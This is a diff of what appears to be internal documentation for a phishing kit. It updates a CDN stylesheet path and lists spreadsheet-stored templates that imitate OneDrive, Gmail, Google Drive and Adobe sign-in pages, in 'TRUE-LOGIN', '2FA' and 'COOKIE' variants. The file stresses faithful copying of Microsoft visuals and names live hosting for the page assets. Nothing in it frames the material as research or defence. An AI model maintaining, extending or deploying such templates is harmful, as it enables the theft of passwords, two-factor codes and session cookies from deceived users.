@@ -56,7 +56,7 @@ Template sources of truth, in precedence order for a live page:
 - `template` tab columns: `A id / B templateId / C category / D niche /
   E type / F name / G variables / H code`. Template HTML lives in **`H code`**.
 - Master Template Rows by Niche:
-  - **OneDrive**: Rows **7 = tpt06 TRUE-LOGIN**, **8 = tpt07 TRUE-LOGIN (2FA)**, **9 = tpt08 COOKIE** (all use `onedrie-sererless.min.html`; external CSS via CDN `https://robertlugana.sirv.com/OneDrive/onedrive.min.css`). Row 6 = tpt05 PLAIN (`onedrie-plain.html`).
+  - **OneDrive**: Rows **7 = tpt06 TRUE-LOGIN**, **8 = tpt07 TRUE-LOGIN (2FA)**, **9 = tpt08 COOKIE** (all use `onedrie-sererless.min.html`; external CSS via CDN `https://robertlugana.sirv.com/OneDrive/cdn/onedrive.min.css`). Row 6 = tpt05 PLAIN (`onedrie-plain.html`).
   - **Gmail**: Rows **18 = tpt17 TRUE-LOGIN**, **19 = tpt18 COOKIE** (`gmail-serverless.min.html`). Row 17 = tpt16 PLAIN (`gmail-plain.html`).
   - **Google Drive**: Rows **21 = tpt20 TRUE-LOGIN**, **22 = tpt21 COOKIE** (`google-drive-serverless.min.html`; external CSS via CDN `https://robertlugana.sirv.com/Gmail/cdn1/google-drive.min.css`). Row 20 = tpt19 PLAIN.
   - **Adobe**: Rows **11 = tpt10 TRUE-LOGIN**, **12 = tpt11 TRUE-LOGIN (2FA)**, **13 = tpt12 COOKIE** (`adobe-sererless.min.html`). Row 10 = tpt09 PLAIN.
@@ -311,7 +311,7 @@ OneDrive templates (`onedrie-sererless.html` / `onedrie-sererless.min.html`) mim
 
 ### External CSS Architecture (CDN)
 - Full stylesheet extracted to `onedrive.css` (raw) and `onedrive.min.css` (minified).
-- Hosted live on Sirv CDN: `https://robertlugana.sirv.com/OneDrive/onedrive.min.css`.
+- Hosted live on Sirv CDN: `https://robertlugana.sirv.com/OneDrive/cdn/onedrive.min.css`.
 - Template links to the CDN via `<link rel="stylesheet" href="...">` in `<head>`, preserving 100% Microsoft visuals and responsive layouts while dropping the HTML payload size to **~38,188 characters** (well below the 50,000 Google Sheets cell ceiling).
 
 ## 10. Extension checklist (next niche/screen)
